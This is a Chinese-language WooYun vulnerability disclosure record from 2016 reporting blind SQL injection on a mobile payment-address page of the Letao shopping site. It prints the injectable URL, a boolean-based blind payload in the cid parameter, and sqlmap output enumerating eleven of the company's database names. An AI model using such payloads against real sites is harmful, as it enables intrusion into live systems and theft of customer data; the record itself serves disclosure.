{"id": 73692, "wybug_id": "wooyun-2016-0173100", "wybug_title": "乐淘分站注入涉及大量用户数据", "wybug_corp": "乐淘网", "wybug_author": "路人甲", "wybug_date": "2016-01-27 16:33", "wybug_open_date": "2016-02-01 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 乐淘分站注入涉及大量用户数据 详细说明：  注入点：http://huan.letao.com/wap/pay/address.aspx?tid=0&form=0&addressid=&aid=130706&cid=130700&pid=130000&uuid1453881206&add=&c=&op=newadd cid pid貌似都可以注入构造一下盲注http://huan.letao.com/wap/pay/address.aspx?tid=0&form=0&addressid=&aid=130706&cid=130700' and 1=(case when 1=1 then 1 else 2/0 end) and  '1'='1&pid=130000&uuid1453881206&add=&c=&op=newadd 1=1 正常，1=2 返回错误页面   漏洞证明：  sqlmap可以直接跑数据custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] [16:22:46] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://huan.letao.com:80/wap/pay/address.aspx?tid=0&form=0&addressid=&aid=130706&cid=130700' and 1=(case when 1=1 AND 8991=8991 then 1 else 2/0 end) and  '1'='1&pid=130000&uuid1453881206&add=&c=&op=newadd---[16:22:48] [INFO] testing Microsoft SQL Server[16:22:48] [INFO] confirming Microsoft SQL Server[16:22:48] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008[16:22:48] [INFO] fetching database names[16:22:48] [INFO] fetching number of databases[16:22:48] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:22:48] [INFO] retrieved: sqlmap got a 302 redirect to 'http://huan.letao.com:80/404error.htm'. Do you want to follow? [Y/n] n[16:22:50] [WARNING] reflective value(s) found and filtering out11[16:22:51] [INFO] retrieved: ASPState[16:23:00] [INFO] retrieved: distribution[16:23:12] [INFO] retrieved: ImagesRecord[16:23:24] [INFO] retrieved: letao_accounting[16:23:40] [INFO] retrieved: Letao_Web_Log[16:23:53] [INFO] retrieved: letaoerp[16:24:02] [INFO] retrieved: master[16:24:08] [INFO] retrieved: model[16:24:14] [INFO] retrieved: msdb[16:24:19] [INFO] retrieved: tempdb[16:24:25] [INFO] retrieved: test2_letaoerpavailable databases [11]:[*] ASPState[*] distribution[*] ImagesRecord[*] letao_accounting[*] Letao_Web_Log[*] letaoerp[*] master[*] model[*] msdb[*] tempdb[*] test2_letaoerp从历史漏洞来看，应该是整站数据都在了   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-01 16:40 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}